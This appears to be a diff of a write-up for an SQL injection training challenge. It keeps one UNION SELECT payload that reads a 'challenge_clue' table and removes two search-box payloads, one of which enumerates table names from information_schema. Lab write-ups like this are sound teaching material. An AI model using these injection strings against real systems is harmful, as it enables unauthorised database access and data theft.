@@ -17,9 +17,3 @@ NOTE: You will have to figure out which style of comments is being used. It can 
 
 3. Similarly construct a query for getting the contents out of the challenge_clue table. The query will be:-
 ' union select * from challenge_clue-- 
-
-## Search Box – Get table names
-**Search Input:** <code>' UNION ALL SELECT table_name, 1, 1 FROM information_schema.tables-- </code> (include the space at the end)
-
-## Search Box – Get challenge clue
-**Search Input:** <code>' UNION ALL SELECT *, 1 FROM challenge_clue -- </code> (include the space at the end)
